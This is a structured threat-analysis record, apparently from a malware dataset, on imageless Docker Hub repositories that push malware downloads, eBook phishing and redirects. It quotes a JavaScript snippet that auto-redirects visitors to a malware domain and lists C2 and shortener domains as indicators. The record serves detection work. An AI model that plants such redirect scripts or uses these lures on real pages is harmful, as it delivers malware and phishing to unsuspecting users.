package_info.package_name: Imageless Malicious Docker Hub Repositories (Downloader, eBook Phishing, Website SEO Campaigns)
package_info.package_versions: N/A (affects millions of repositories, not versioned)
package_info.why_malicious: These repositories exploit Docker Hub's documentation and metadata features to distribute malicious links, phishing pages, and malware payloads. They lack legitimate Docker images and are mass-created by automated accounts to lure users into downloading malware or submitting credentials, representing a large-scale abuse of the platform.

execution_context.trigger: user-initiated (viewing repository documentation and clicking link)

malicious_snippets.code_behavior: When a user views the repository documentation and clicks the link, the browser initiates a network request to a fake URL shortener, which then redirects to a dynamic malware-serving page, resulting in the download of a malicious executable.

malice_analysis.why_suspicious: The use of a fake URL shortener in repository documentation to redirect users to external, non-official domains is a strong indicator of malicious intent, especially when the final destination serves malware.
malice_analysis.violated_expectations: Legitimate Docker Hub documentation provides usage instructions or links to official project resources, not to obfuscated or shortened links leading to malware.
malice_analysis.similar_legitimate_use: Legitimate documentation may link to official project sites or trusted documentation, but never to unknown shorteners or dynamic redirectors.
key_indicators: Presence of fake URL shortener domains in documentation
Links resolve to malware payloads instead of legitimate resources
Repository contains no actual Docker image content

execution_context.trigger: user-initiated (viewing repository documentation and clicking link)

malicious_snippets.code_behavior: When a user clicks the link in the documentation, the browser is directed through a Google open redirect with undocumented parameters, forwarding the user to a malicious file hosting site and bypassing Google's redirect warning, resulting in the download of a malware payload.

malice_analysis.why_suspicious: Abusing Google's open redirect with specific parameters to conceal the true destination and deliver malware is a known phishing and malware tactic.
malice_analysis.violated_expectations: Legitimate documentation does not use open redirect exploits to hide the actual download source or to deliver malware.
malice_analysis.similar_legitimate_use: Open redirects may be used for tracking in rare cases, but not for malware delivery or to bypass user warnings.
key_indicators: Use of Google open redirect with usg and sntz parameters
Final destination is a malware-serving domain
Obfuscation of the true download source in documentation

execution_context.trigger: user-initiated (viewing repository documentation and clicking link)

malicious_snippets.code_behavior: When a user clicks the link in the documentation, the browser navigates to a phishing website that mimics an eBook download page, prompting the user to enter credit card details under the pretense of a free download, resulting in credential theft.

malice_analysis.why_suspicious: Directing users to external sites that request sensitive information such as credit card details from repository documentation is a clear phishing tactic.
malice_analysis.violated_expectations: Legitimate repositories do not require payment or sensitive information for documentation access or downloads.
malice_analysis.similar_legitimate_use: There is no legitimate use case for requesting credit card data via documentation links; such behavior is always malicious.
key_indicators: Links to disposable domains such as blogspot.com
Redirection to phishing payment forms requesting sensitive data
Repository lacks any actual Docker image content

malicious_snippets.code_snippet:
<script type='text/javascript'>
  var c = new URL(window.location).searchParams.get('el');
  if(c!=null){
    setTimeout('write()', 500);
    setTimeout('Redirect()', 0);
  }else{
   window.setTimeout(function(){
     document.getElementById('redir').href='https://gohhs.com/';
   }, 500);
  }
  function write()
  {
   document.getElementById('redir').href='https://gohhs.com/'+c;
 }
 function Redirect()
 {
   window.location.replace('https://gohhs.com/'+c);
 }
</script>
malicious_snippets.code_behavior: When the documentation page is loaded, the embedded JavaScript checks for a URL parameter and, if present, automatically redirects the user to a malware-serving domain after a short delay, enabling drive-by malware delivery without user interaction.

malice_analysis.why_suspicious: Embedding JavaScript in repository documentation to perform automatic redirection to external domains is highly suspicious and not consistent with legitimate documentation practices.
malice_analysis.violated_expectations: Legitimate Docker Hub documentation is static and does not execute client-side scripts that redirect users to external sites.
malice_analysis.similar_legitimate_use: Client-side redirects may occur on official project websites, but not within Docker Hub documentation.
key_indicators: Automatic redirection to external domains via JavaScript
Use of obfuscated or disposable domains in redirection
No legitimate user interaction required for redirection

execution_context.trigger: user-initiated (downloading and executing payload from malicious site)

malicious_snippets.code_snippet: freehtmlvalidator.exe (Embarcadero RAD Studio 27.0 binary, C2: http://soneservice[.]shop/new/net_api)
malicious_snippets.code_behavior: When the user executes the downloaded binary, it collects system information (including OS, hardware, browser, .NET version, running processes, and network adapters), sends this data to a C2 server using XOR+hex-encoded HTTP POST requests, receives further instructions and payload URLs, and installs additional binaries with persistence via Windows scheduled tasks.

malice_analysis.why_suspicious: The binary performs extensive system reconnaissance, communicates with a remote C2 server using obfuscated protocols, and establishes persistence by installing additional payloads, all of which are hallmarks of sophisticated malware.
malice_analysis.violated_expectations: A legitimate installer would not exfiltrate system data, communicate with unknown C2 servers, or install unrelated binaries with persistence mechanisms.
malice_analysis.similar_legitimate_use: Some legitimate updaters may check system info, but not with obfuscated C2 communications or by installing unrelated payloads.
key_indicators: XOR+hex-encoded C2 communication over HTTP POST
System reconnaissance and exfiltration of host details

attack_chain.action: User discovers and views a malicious Docker Hub repository with enticing documentation (e.g., pirated software, eBooks).
attack_chain.leads_to: User clicks a malicious link in the documentation.

attack_chain.action: User is redirected via fake shortener, open redirect, or JavaScript to a malware-serving or phishing site.
attack_chain.leads_to: User is prompted to download a malicious file or enter sensitive information.

attack_chain.action: User downloads and executes a malicious payload (EXE) or enters credit card details on a phishing site.
attack_chain.leads_to: Malware is installed with persistence, or credentials are stolen.

attack_chain.action: Malware establishes C2 communication, exfiltrates system info, and downloads further payloads.
attack_chain.leads_to: System compromise, further malware installation, or monetization via adware.

behavioral_signatures: Docker Hub repository documentation containing shortened or obfuscated external links to non-official domains
Automatic JavaScript redirection embedded in repository documentation
EXE payloads that perform system reconnaissance and communicate with remote C2 servers using obfuscated protocols
Persistence established via Windows scheduled tasks created by unknown binaries
file_indicators: Imageless Docker Hub repositories with only documentation and no image tags
Repository descriptions containing links to known fake shortener domains (e.g., blltly.com, tinourl.com)
Downloaded files named like freehtmlvalidator.exe, Instalar-crack-presto-*.zip
network_indicators: Connections to fake shortener domains such as blltly.com, tinourl.com
Connections to malware C2 domains including soneservice.shop, failhostingpolp.ru, gts794.com
HTTP POST requests with XOR+hex-encoded JSON payloads to C2 endpoints
detection_knowledge.how_to_detect: Scan Docker Hub repositories for documentation containing external links to known malicious or fake shortener domains, embedded JavaScript redirection, or phishing forms. Monitor for downloads of executable files from these domains and subsequent C2 traffic. Flag imageless repositories with suspicious metadata for review. Detect persistence mechanisms such as scheduled tasks created by unknown binaries, and monitor for system reconnaissance activity and encoded outbound HTTP POSTs to suspicious domains.
